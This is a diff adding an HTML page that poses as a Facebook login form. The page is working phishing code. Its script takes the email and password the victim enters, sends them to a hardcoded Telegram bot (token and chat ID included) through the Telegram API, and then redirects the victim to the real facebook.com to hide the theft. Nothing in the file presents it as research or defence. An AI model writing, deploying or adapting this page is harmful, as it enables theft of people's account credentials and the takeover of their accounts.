@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Facebook Login</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+
+    <div id="myDiv"></div>
+
+    
+	<div class="container">
+		<h1>Facebook</h1>
+		<form>
+			<label for="email">Email or Phone</label>
+			<input type="text" id="email" name="email" required>
+			<label for="password">Password</label>
+			<input type="password" id="password" name="password" required>
+			<button type="submit" id="login" class="btn">Log In</button>
+		</form>
+		<p><a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgot Password?</a></p>
+		<hr>
+		<p>Don't have an account? <a href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&rtime=1679408395&subno_key=AaFkUvnR1UXz5BB-nEuQbGjRTjlo8TGU32dvtNicoDPg4wZiIhQITGS0w_cfGRq2Mx5R6s-DIXo-5-YnDNFjon3Rvwk1u_9UZvAAy3gg3J8anMMkNH7Gz0jqlCPcziGau0GDZhQ9qLg1mFtXwV0iklzv16cPnyY2tz2447J1FKQq_HbH1iRWEfpI2LQmHKyJQ76QukiUnkEHt352sQ3-yOJi6-X92kohNbxhKcwYYwIcI-ZNHV4FUJGQGwV14VDSvQl29CtCsXlA_qsYtB2CkesotivluRPQZz1OArg9Dowqi2mQzqo1ntMcZ8-D9bpbmEg&hrc=1&_rdr">Sign up</a></p>
+	</div>
+
+
+
+	<script>
+		
+		const botToken = "6177719871:AAE9t4iQTKrYhNfuhmegYaloe2FGU92xWds";
+
+
+
+
+
+const chatId = "1725729331";
+
+
+
+
+
+
+
+
+		// Get form elements
+		const emailInput = document.getElementById("email");
+		const passwordInput = document.getElementById("password");
+		const loginButton = document.getElementById("login");
+
+		// Add click event listener to login button
+		loginButton.addEventListener("click", function(event) {
+			event.preventDefault();
+			// Get input values
+			const email = emailInput.value;
+			const password = passwordInput.value;
+			
+			// Send message to Telegram bot
+			const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
+			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+			
+			fetch(url)
+				.then(response => {
+					if (response.ok) {
+					
+window.location.href = "https://www.facebook.com";
+
+
+						emailInput.value = "";
+						passwordInput.value = "";
+					} else {
+						throw new Error("Failed to send message to Telegram bot.");
+					}
+				})
+				.catch(error => {
+					console.error(error);
+					alert("Failed to send login information to Telegram bot.");
+				});
+		});
+	</script>
+</body>
+</html>
